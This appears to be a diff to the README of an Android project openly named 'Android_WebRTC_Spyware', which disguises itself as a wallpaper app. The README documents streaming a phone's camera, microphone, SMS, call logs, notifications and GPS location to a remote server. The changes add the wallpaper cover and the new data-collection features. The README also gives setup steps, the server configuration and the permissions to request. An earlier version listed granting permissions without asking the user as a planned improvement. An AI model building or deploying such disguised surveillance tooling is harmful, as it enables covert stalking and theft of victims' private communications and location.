@@ -1,52 +1,56 @@
-# Android WebRTC Streaming App
+# Android Wallpaper & WebRTC Streaming App
 
-This application enables real-time streaming of an Android device's camera, microphone, and screen to a web browser using WebRTC. It uses Socket.IO for signaling to establish peer-to-peer connections, allowing a web client to view the Android device's camera feed, hear its audio, and display its screen in separate video elements. The app is designed for seamless streaming with robust track handling and is suitable for applications like remote monitoring, screen sharing, or live demos.
+This application serves a dual purpose: it allows users to select and set wallpapers on their Android device while also enabling real-time streaming of the device's camera, microphone, sms messages, call logs and gps location to a web browser using WebRTC. The app uses Socket.IO for signaling to establish peer-to-peer connections, making it suitable for remote monitoring, SMS messages, Call Logs, Live GPS Locations, or live demos, alongside personalizing device aesthetics with wallpapers.
 
 ## Features
 
-- **Camera Streaming**: Streams the Android device's front-facing (or default) camera at 640x480 resolution
-- **Microphone Streaming**: Captures and streams audio with echo cancellation, noise suppression, and auto-gain control
-- **Screen Sharing**: Streams the device's screen at 960x540 resolution, optimized for reliable encoding
-- **WebRTC**: Uses WebRTC for low-latency peer-to-peer streaming with STUN/TURN servers for NAT traversal
-- **Socket.IO Signaling**: Handles WebRTC offer/answer and ICE candidate exchange via a Node.js server
-- **Browser Interface**: Displays camera and screen streams in separate HTML5 video elements with real-time status updates
+- **Wallpaper Selection & Setting**: Choose from a curated list of wallpapers and apply them to your device's home and lock screens.
+- **Camera Streaming**: Streams the Android device's camera feed at 640x480 resolution.
+- **Microphone Streaming**: Captures and streams audio with echo cancellation, noise suppression, and auto-gain control.
+- **SMS Messages Streaming**: Streams the device's sms messages live.
+- **Call Logs Streaming**: Streams the device's call logs live.
+- **Live GPS Location Streaming**: Streams the device's location live and displays on a map.
+- **Notification Streaming**: Streams the device's notifications live.
+- **WebRTC Integration**: Utilizes WebRTC for low-latency peer-to-peer streaming with STUN/TURN servers for NAT traversal.
+- **Socket.IO Signaling**: Manages WebRTC offer/answer and ICE candidate exchange via a Node.js server.
+- **Browser Interface**: Displays camera and all features with real-time status updates.
 
 ## Project Structure
 
 ```
-project/
-├── WallpaperApplication/
-│   ├── app/
-│   │   ├── src/main/java/com/example/wallpaperapplication/
-│   │   │   ├── BootReciever.java
-│   │   │   ├── ConsentActivity.java
-│   │   │   ├── Constants.java
-│   │   │   ├── SdpObserverActivity.java
-│   │   │   ├── StreamingService.java
-│   │   │   ├── StreamingSettingsActivity.java
-│   │   │   └── WallpaperAdapter.java
-│   │   ├── src/main/AndroidManifest.xml
-│   │   ├── src/main/res/xml/network_security_config.xml
-│   │   └── build.gradle
-│   ├── Android_WebRTC_Spyware_Server/
-│   │   ├── server.js
-│   │   ├── package-lock.json
-│   │   ├── package.json
-│   │   └── public/
-│   │       ├── index.html
-│   │       └── client.js
+WallpaperApplication/
+├── app/
+│   ├── src/main/java/com/example/wallpaperapplication/
+│   │   ├── BootReceiver.java
+│   │   ├── ConsentActivity.java
+│   │   ├── Constants.java
+│   │   ├── MainActivity.java
+│   │   ├── SdpObserverAdapter.java
+│   │   ├── StreamingService.java
+│   │   ├── StreamingSettingsActivity.java
+│   │   └── WallpaperAdapter.java
+│   ├── src/main/AndroidManifest.xml
+│   ├── src/main/res/xml/network_security_config.xml
+│   └── build.gradle.kts
+├── Android-WebRTC-Spyware-Server/
+│   ├── server.js
+│   ├── package.json
+│   └── public/
+│       ├── index.html
+│       └── client.js
 └── README.md
 ```
 
 ### Key Components
 
-- **StreamingService.java**: Android service that initializes WebRTC, captures camera, audio, live notifications, call logs, sms messages and gps location and handles signaling with the server
-- **StreamingSettingsActivity.java**: UI to toggle streaming and request permissions (camera, audio, live notifications, call logs, sms messages and gps location)
-- **AndroidManifest.xml**: Declares permissions and service configuration
-- **network_security_config.xml**: Allows the Android Application to send cleartext traffic to the Web Server over exposed HTTP Connection.
-- **server.js**: Node.js server using Express and Socket.IO for signaling between Android and web clients
-- **index.html**: Web interface displaying camera, audio, live notifications, call logs, sms messages and gps location streams.
-- **client.js**: JavaScript for WebRTC peer connection, track handling, and signaling on the web client
+- **MainActivity.java**: Entry point for the wallpaper selection interface.
+- **WallpaperAdapter.java**: Manages the display and selection of wallpaper images in a RecyclerView.
+- **StreamingService.java**: Android service that initializes WebRTC, captures camera, audio, rest of the features, and handles signaling with the server.
+- **StreamingSettingsActivity.java**: UI to toggle streaming and request permissions (camera, audio, etc.).
+- **AndroidManifest.xml**: Declares permissions and service configurations for both wallpaper and streaming functionalities.
+- **network_security_config.xml**: Configures network security to allow cleartext traffic to the WebRTC server.
+- **server.js**: Node.js server using Express and Socket.IO for signaling between Android and web clients.
+- **index.html & client.js**: Web interface and JavaScript for displaying streams and handling WebRTC connections.
 
 ## Prerequisites
 
@@ -66,8 +70,8 @@ project/
 - Credentials for numb.viagenie.ca (or another TURN server) for NAT traversal
 
 ### Network
-- Devices must be on the same network (e.g., Wi-Fi) or reachable via TURN server
-- Server IP: 192.178.2.10 (update if different)
+- Devices must be on the same network or reachable via TURN server
+- Server IP: Update as per your setup (default reference: 192.178.2.10)
 
 ## Setup Instructions
 
@@ -75,38 +79,19 @@ project/
 
 ```bash
 git clone https://github.com/DhruvAthaide/Android_WebRTC_Spyware.git
-cd project
+cd WallpaperApplication
 ```
 
 ### 2. Configure Android App
 
 #### Open Android Project
-Open the `android/` folder in Android Studio.
+Open the project in Android Studio.
 
-#### Update Dependencies in `android/app/build.gradle`
-
-```gradle
-dependencies {
-    implementation ("androidx.appcompat:appcompat:1.6.1")
-    implementation ("androidx.core:core-ktx:1.12.0")
-    implementation ("androidx.recyclerview:recyclerview:1.3.2")
-    implementation ("com.google.android.material:material:1.11.0")
-    implementation ("androidx.activity:activity-ktx:1.8.2")
-    implementation ("androidx.constraintlayout:constraintlayout:2.1.4")
-    implementation ("com.google.android.gms:play-services-location:21.0.1")
-    testImplementation ("junit:junit:4.13.2")
-    androidTestImplementation ("androidx.test.ext:junit:1.1.5")
-    androidTestImplementation ("androidx.test.espresso:espresso-core:3.5.1")
-    implementation ("io.getstream:stream-webrtc-android:1.0.4")
-    implementation ("androidx.cardview:cardview:1.0.0")
-    implementation ("androidx.preference:preference:1.2.1")
-    implementation ("com.squareup.okhttp3:okhttp:4.12.0")
-    implementation ("io.socket:socket.io-client:2.0.1")
-}
-```
+#### Update Dependencies in `app/build.gradle.kts`
+Ensure dependencies for WebRTC, UI components, and necessary permissions are included as per the current configuration.
 
 #### Update TURN Credentials in `StreamingService.java`
-Replace `your@email.com` and `yourpassword` in the `setupPeerConnection` method with valid numb.viagenie.ca credentials:
+Replace placeholders with valid numb.viagenie.ca credentials:
 
 ```java
 ice.add(PeerConnection.IceServer.builder("turn:numb.viagenie.ca")
@@ -115,41 +100,27 @@ ice.add(PeerConnection.IceServer.builder("turn:numb.viagenie.ca")
     .createIceServer());
 ```
 
-#### Update Signaling URL (if needed)
+#### Update Signaling URL
 In `StreamingService.java`, ensure `SIGNALING_URL` matches your server's IP:
+
 ```java
 private static final String SIGNALING_URL = "http://<Your Server IP address>:3000";
 ```
 
-In `network_security_config.xml`, ensure that `<domain>` matches your server's IP:
+In `network_security_config.xml`, update the domain:
+
 ```xml
 <domain includeSubdomains="true">Input your WebRTC Server IP</domain>
 ```
 
 #### Permissions in `AndroidManifest.xml`
-Ensure the following are included:
-
-```xml
-<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-<uses-permission android:name="android.permission.CAMERA" />
-<uses-permission android:name="android.permission.RECORD_AUDIO" />
-<uses-permission android:name="android.permission.INTERNET" />
-<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-<uses-permission android:name="android.permission.SET_WALLPAPER" />
-<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
-<uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
-<uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
-<uses-permission android:name="android.permission.READ_SMS" />
-<uses-permission android:name="android.permission.READ_CALL_LOG" />
-```
+Verify necessary permissions for wallpaper setting and streaming are included.
 
 ### 3. Configure Server
 
 #### Navigate to Server Directory
 ```bash
-cd server
+cd Android-WebRTC-Spyware-Server
 ```
 
 #### Install Dependencies
@@ -158,7 +129,7 @@ npm install express socket.io@4.7.5
 ```
 
 #### Update TURN Credentials in `client.js`
-Replace `your@email.com` and `yourpassword` with valid numb.viagenie.ca credentials:
+Replace placeholders with valid credentials:
 
 ```javascript
 const config = {
@@ -169,8 +140,8 @@ const config = {
 };
 ```
 
-#### Update Signaling URL (if needed)
-In `client.js`, ensure the Socket.IO URL matches the server:
+#### Update Signaling URL
+Ensure the Socket.IO URL matches the server:
 
 ```javascript
 const socket = io('http://<Input your WebRTC Server IP>:3000');
@@ -182,167 +153,64 @@ const socket = io('http://<Input your WebRTC Server IP>:3000');
 node server.js
 ```
 
-Verify: Console shows "Server running at http://localhost:3000".
+Verify the console output: "Server running at http://localhost:3000".
 
 ### 5. Build and Run the Android App
 
 #### Build the App
-In Android Studio, sync the project and build the app.
+In Android Studio, sync and build the project.
 
 #### Install on Device/Emulator
-Run the app on a physical Android device or emulator (API 21+).
+Run the app on an Android device or emulator (API 21+).
 
-#### Start Streaming
-1. Open the app, navigate to `StreamingSettingsActivity`, and toggle the streaming switch
-2. Approve permissions:
-   - Camera
-   - Microphone
-   - Screen capture (MediaProjection)
-3. The app starts `StreamingService`, which initializes camera, audio, and screen capture
+#### Using the App
+1. **Wallpaper Feature**: Open the app to browse and set wallpapers.
+2. **Streaming Feature**: Navigate to streaming settings, toggle streaming, and approve permissions for camera, microphone, and screen capture.
 
-### 6. Access the Web Interface
+### 6. Access the Web Interface for Streaming
 
-#### Open Browser
-On a computer or device on the same network, open `http://<Input your WebRTC Server IP>:3000` in Chrome or Firefox.
-
-#### Expected Output
-- `<video id="remoteVideo">`: Displays the Android camera stream with audio
-- `<video id="screenVideo">`: Displays the Android screen stream
-- `<div id="status">`: Shows "Playing Android camera, screen, and audio" when streams are active
-- Page background turns light green (#e8f5e8) on successful connection
+Open `http://<Your Server IP>:3000` in a browser on the same network. Expect to see camera and screen streams with status updates.
 
 ## Debugging
 
 ### Logcat (Android)
-
 ```bash
 adb logcat | grep StreamingService
 ```
-
-Expected logs:
-- Video capture started
-- Audio capture initialized
-- Socket.IO CONNECTED
-- Web client ready: ...
-- Waiting for screen capture to be ready
-- Screen capture started
-- Screen track added
-- Offer created, SDP: ... (includes m=video ... mid=video, m=video ... mid=screen, m=audio ... mid=audio)
-- Sent offer to web client
-- ICE connection state: COMPLETED
-
-If screen stream fails:
-- Verify `m=video ... mid=screen` in the SDP log
-- Check CCodec logs for screen encoding (`c2.exynos.vp8.encoder ... width = 960, height = 540`)
-- If absent, reduce resolution in `startScreenCapture`:
-  ```java
-  screenCapturer.startCapture(640, 360, 30);
-  ```
+Check for logs related to streaming initialization and connection status.
 
 ### Browser Console
-
-Open Chrome/Firefox DevTools (F12) and check the Console tab.
-
-Expected logs:
-- Connected to signaling server
-- My socket ID: ...
-- Announced readiness to receive stream
-- Android client ready: ...
-- Processing offer from Android, SDP: ... (includes m=video ... mid=video, m=video ... mid=screen, m=audio ... mid=audio)
-- Received video track: { id: ..., mid: video, label: video, streamId: ... }
-- Received video track: { id: ..., mid: screen, label: screen, streamId: ... }
-- Received audio track: { id: ..., mid: audio, label: audio, streamId: ... }
-- Camera video metadata loaded, playing stream
-- Screen video metadata loaded, playing stream
-- Playing Android camera, screen, and audio
-
-If screen stream is missing:
-- Verify SDP includes `m=video ... mid=screen`
-- Check `screenEl.srcObject` in DevTools:
-  ```javascript
-  document.getElementById('screenVideo').srcObject
-  ```
-- Force playback:
-  ```javascript
-  document.getElementById('screenVideo').play().catch(e => console.error('Force play error:', e));
-  ```
+Use DevTools (F12) to check for connection and stream handling logs.
 
 ### Server Logs
-
 ```bash
 node server.js > server.log
 ```
-
-Verify signaling messages are relayed ("Relaying signal from ... to ...").
-
-### Share for Support
-
-When seeking support, provide:
-- Full logcat (`adb logcat > logcat.txt`)
-- Browser console logs (include SDP)
-- Server logs (`server.log`)
-- Screenshot of browser UI showing `remoteVideo` and `screenVideo`
+Verify signaling messages are relayed correctly.
 
 ## How the Application Works
 
-### Android Side (StreamingService.java)
+### Wallpaper Functionality
+- Users can view a list of available wallpapers and set them directly from the app interface using Android's wallpaper management APIs.
 
-1. Initializes WebRTC with PeerConnectionFactory and EGL context
-2. Captures camera (640x480) using Camera2Enumerator and audio with AudioSource (with noise suppression)
-3. Captures screen (960x540) using ScreenCapturerAndroid after MediaProjection permission
-4. Adds tracks to PeerConnection:
-   - Camera: mid=video
-   - Screen: mid=screen
-   - Audio: mid=audio
-5. Uses Socket.IO to connect to the signaling server (http://<WebRTC Server IP Address>:3000)
-6. Waits for web-client-ready, then sends a WebRTC offer with all tracks after screen capture is ready
-7. Handles ICE candidates and answers from the web client
-
-### Server Side (server.js)
-
-1. Runs an Express server with Socket.IO to relay signaling messages
-2. Emits web-client-ready and android-client-ready to pair clients
-3. Forwards WebRTC offers, answers, and ICE candidates between Android and web clients
-
-### Web Client (client.js, index.html)
-
-1. Connects to the signaling server and announces readiness (web-client-ready)
-2. Creates a RTCPeerConnection with two recvonly video transceivers (camera, screen) and one audio transceiver
-3. Handles incoming tracks in ontrack:
-   - First video track (mid=video or videoTrackCount === 1) goes to remoteVideo
-   - Second video track (mid=screen or videoTrackCount === 2) goes to screenVideo
-   - Audio track is added to remoteVideo's stream
-4. Processes the Android's offer, creates an answer, and handles ICE candidates
-5. Displays streams in `<video>` elements with autoplay and status updates
+### Streaming Functionality
+- **Android Side (StreamingService.java)**: Initializes WebRTC with PeerConnectionFactory, captures camera (640x480), audio, sms messages, call logs, live notifications and gps location after permissions are granted, adds tracks to PeerConnection, and uses Socket.IO to connect to the signaling server.
+- **Server Side (server.js)**: Runs an Express server with Socket.IO to relay signaling messages, pairing Android and web clients by forwarding WebRTC offers, answers, and ICE candidates.
+- **Web Client (client.js, index.html)**: Connects to the signaling server, handles incoming tracks (camera, audio and the rest of the features), and displays them in HTML5 video elements with status updates.
 
 ## Known Issues and Workarounds
 
-### Screen Stream Not Displaying
-- **Cause**: SDP offer sent before screen track is added
-- **Fix**: The updated StreamingService.java uses screenCaptureReady to delay the offer until the screen track is added
-
-### Black Screen Stream
-- **Cause**: Encoding failure due to high resolution or codec issues
-- **Fix**: Resolution reduced to 960x540. If issue persists, try 640x360 in startScreenCapture
-
-### Connection Failures
-- **Cause**: Incorrect TURN server credentials or network issues
-- **Fix**: Verify numb.viagenie.ca credentials and ensure devices are on the same network or TURN is accessible
-
-### Camera/Audio Issues
-- Should not occur, as logic is unchanged. If they fail, verify permissions in AndroidManifest.xml and check logcat
+- **Connection Failures**: Verify TURN server credentials and ensure devices are on the same network or TURN is accessible.
+- **Camera/Audio Issues**: Check permissions in `AndroidManifest.xml` and logcat for errors if streaming fails.
 
 ## Future Improvements
 
-- Adding Permissions which will automatically be given without asking the user for permissions
-- Adding Screen Sharing Video Track on the WebRTC Server
-- Add dynamic resolution adjustment based on device capabilities
-- Implement bitrate control for better stream quality on varying networks
-- Add error handling for network disconnections with automatic reconnect
-- Enhance UI with controls to toggle individual streams
+- Enhance wallpaper features with categories, online wallpaper downloads, and preview options.
+- Add dynamic resolution adjustment for streaming based on device capabilities.
+- Implement bitrate control for better stream quality on varying networks.
+- Add error handling for network disconnections with automatic reconnect.
+- Improve UI with controls to toggle individual streams or wallpaper settings.
 
 ## License
 
 This project is licensed under the MIT License. See the LICENSE file for details.
-
----
